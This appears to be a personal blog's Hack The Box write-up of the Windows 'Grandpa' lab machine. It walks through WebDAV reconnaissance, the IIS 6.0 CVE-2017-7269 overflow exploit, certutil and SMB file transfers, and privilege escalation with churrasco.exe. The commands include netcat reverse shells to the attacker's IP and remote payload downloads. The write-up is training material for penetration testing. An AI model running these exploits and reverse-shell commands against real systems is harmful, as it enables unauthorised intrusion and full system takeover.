---
layout: post
title:  "Grandpa Writeup - Hack The Box"
date:   2025-05-16
desc: ""
keywords: "HTB,OSCP,eWPT,eJPT,Windows,Microsoft IIS 6.0,WebDAV,Token Kidnapping,Churrasco,Easy"
categories: [HTB]
tags: [HTB,OSCP,eWPT,eJPT,Windows,Microsoft IIS 6.0,WebDAV,Token Kidnapping,Churrasco,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

With the **Grandpa** machine I was able to exploit vulnerabilities and use exploits that I had already used on other machines, which allowed me to reinforce my knowledge. It is classified as **Easy** by the community that uses the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform, but again I say that this valuation is **very subjective**, because if you do not have the necessary skills, the machine can become hard to vulnerate. I always find **Windows OS** machines very rewarding to deal with, and this one was no exception. So I spawn the box and start my practice.

<br /><br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I check with `ping` my connectivity with the machine by sending a trace, the reception and sending of a response packet confirms me that everything is correct. With the tool `whichSystem.py` developed by the **[Hack4u](https://hack4u.io/){:target="_blank"}** community I check that the **OS** installed on the machine is **Windows** (using the **TTL** value as a reference). With `nmap` I get information about the open ports, but using **TCP** protocol, and also about the services and their versions. On port **80 [WebDAV](https://www.jscape.com/blog/what-is-webdav){:target="_blank"}** is available, but the most interesting are the very dangerous methods allowed to interact through this protocol. With `whatweb` from my terminal and with **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** from the browser I can leak information of the web server technologies, not very interesting.

> **[WebDAV](https://www.jscape.com/blog/what-is-webdav){:target="_blank"}**, or **Web Distributed Authoring and Versioning**, enhances HTTP to allow users to manage and edit files on a web server collaboratively. It supports file sharing, editing, and versioning directly through a web interface, offering a more collaborative and firewall-friendly alternative to FTP. WebDAV facilitates in-place file editing, making it ideal for team projects.

```bash
ping -c 1 10.10.10.14
whichSystem.py 10.10.10.14
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.14 -oG allPorts
nmap -sCV -p80 10.10.10.14 -oN targeted
cat targeted
#    --> WebDAV type: Unknown
#    --> |_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH

whatweb http://10.10.10.14
```

<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I use an `nmap` script to find hidden directories or files in the web service on port **80**, but there is nothing that allows me to find an attack vector. I can resort to the `davtest` tool to check if the **DAV service** can be exploited by uploading malicious files using the enabled methods, unfortunately it reports that it could not upload any with typical extensions.

> **DAVTest** tests **WebDAV** enabled servers by uploading test executable files, and then (optionally) uploading files which allow for **command execution** or other actions directly on the target. It is meant for penetration testers to quickly and easily determine if enabled DAV services are exploitable.

```bash
nmap --script http-enum -p80 10.10.10.14 -oN webscan

davtest --help
davtest -url http://10.10.10.14
# :(
```

<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I now search with `searchsploit` for applicable exploits for **IIS 6.0**, I find one that exploits a **Remote Buffer Overflow**, so I download the script on my machine. I analyze the file and check that it uses the **PROPFIND** method in the exploit, I must also use the correct version of `python`, in addition to modifying the server **IP** to establish the connection. I run the exploit, but I don't observe any kind of interesting response, like an Interactive Shell, and I realize that I should have analyzed the code first to see what action it performed. The command that the script executes is launching `calc.exe` on the target machine, something that is of no use to me.

```bash
searchsploit iis 6.0
# windows/remote/41738.py

searchsploit -x windows/remote/41738.py
searchsploit -m windows/remote/41738.py

mv 41738.py iis6_exploit.py
python3 iis6_exploit.py
python2 iis6_exploit.py
python2 iis6_exploit.py -h
nvim iis6_exploit.py
cat iis6_exploit.py | grep connect
cat iis6_exploit.py | grep shellcode
python2 iis6_exploit.py
# ??
```

<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `searchploit` I can search for the **URL** of the exploit, this way I know the **CVE** and look for an exploit that some professional of the community has developed and has it available in **Github**. The first one I find is from **[homjxi0e](https://github.com/homjxi0e/cve-2017-7269){:target="_blank"}** but it is written in **Ruby** and I would have to compile it, so I continue my search and I'm lucky because there is one in **Python** that allows to get a reverse shell, it is from **[g0rx](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269){:target="_blank"}**. So I download it on my machine and run it to know what values I should pass, then I open with `nc` a port waiting for the remote connection and exploit the vulnerability with the exploit and succeed in accessing the box.

> **Attacker Machine**:

```bash
searchsploit -w windows/remote/41738.py

mv /home/al3j0/Downloads/cve-2017-7269-master.zip .
unzip -d cve-2017-7269 cve-2017-7269-master.zip

mv /home/al3j0/Downloads/iis6_reverse_shell ./
file iis6_reverse_shell
cat iis6_reverse_shell | head -n 3
mv iis6_reverse_shell iis6_reverse_shell.py
python3 iis6_reverse_shell.py
# :(
python2 iis6_reverse_shell.py
# :)
rlwrap -cAr nc -nlvp 443
python2 iis6_reverse_shell.py 10.10.10.14 80 10.10.14.22 443
```

> **Victime Machine**:

```cmd
whoami
hostname
```

<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After performing the first enumeration commands, I find that the compromised account has the **SeImpersonatePrivilege** privilege enabled, which most likely makes the system vulnerable to `JuicyPotato.exe`, a version of **RottenPotatoNG**. So I download the **[ohpe](https://github.com/ohpe/juicy-potato){:target="_blank"}** binary and transfer it to the victim machine but it doesn't work for the **Windows OS** version, I had forgotten to check before with `systemInfo` this **little detail**. In the **CLSID** list in **ohpe's Github project**, I can check that the version is not supported.

> **Victime Machine**:

```cmd
ipconfig
cd C:\DOCUME~1
whoami /priv
# SeImpersonatePrivilege        Impersonate a client after authentication Enabled

systeminfo
# OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition        :( JuicyPotato maybe not work!
# System Type:               X86-based PC
```

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/JuicyPotato.exe ./JP.exe
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
certutil.exe -f -split http://10.10.14.22/JP.exe
start /b powershell certutil.exe -f -split http://10.10.14.22/JP.exe
```

> **Attacker Machine**:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

> **Victime Machine**:

```cmd
copy \\10.10.14.22\smbFolder\JP.exe .\JP.exe
.\JP.exe
# The image file C:\WINDOWS\Temp\privesc\JP.exe is valid, but is for a machine type other than the current machine.
systemInfo
```

<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Fortunately with a little research I find a very interesting article to **[Escalate privileges using Juicy Potato on a Windows Server 2003](https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/){:target="_blank"}** and in it there is another article that explains the **[use of `churrasco.exe` that allows to escalate privileges](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/){:target="_blank"}**. So the next thing I do is to download the binary shared in the publication to transfer it to the **Grandpa** machine, when I run it it works correctly. I can execute commands impersonating the user with maximum privileges, so I just need to transfer `nc.exe` to the machine and send a **Reverse Shell** to my machine, after several attempts I get it and I can access the last flag, machine completed.

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/churrasco.exe .
impacket-smbserver smbFolder $(pwd) -smb2support
```

> **Victime Machine**:

```cmd
copy \\10.10.14.22\smbFolder\churrasco.exe .\churrasco.exe
.\churrasco.exe -d "whoami"
# :)
```

> **Attacker Machine**:

```bash
locate nc.exe | grep -v Documents
cp /usr/share/windows-resources/binaries/nc.exe ./nc.exe
impacket-smbserver smbFolder $(pwd) -smb2support
rlwrap -cAr nc -nlvp 443
```

> **Victime Machine**:

```cmd
.\churrasco.exe -d "\\10.10.14.22\smbFolder\nc.exe -e cmd 10.10.14.22 443"
# Try several times :)

cd C:\DOCUME~1
dir /s user.txt
dir /s root.txt
```

<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> I never tire of recognizing that **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** labs are excellent, even when they are catalogued as **Easy**, because you can reaffirm old concepts or improve those skills that you think you already have incorporated. I never stop having fun with **Windows** machines, they have become my favorites, because I have very little knowledge of their vulnerabilities and it is very difficult for me to find the attack vector. I kill the **Grandpa** box and go for the next one.

<br /><br />
<img src="{{ site.img_path }}/grandpa_writeup/Grandpa_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
